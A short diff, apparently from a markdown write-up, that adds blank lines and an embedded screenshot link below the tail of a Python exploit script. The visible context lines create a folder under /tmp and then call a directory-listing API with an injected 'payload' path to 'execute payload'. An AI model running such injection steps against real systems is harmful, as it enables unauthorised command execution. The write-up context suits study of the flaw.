@@ -306,3 +306,8 @@ step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/"
 print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
+
+
+
+
+![[Pasted image 20240823150440.png]]
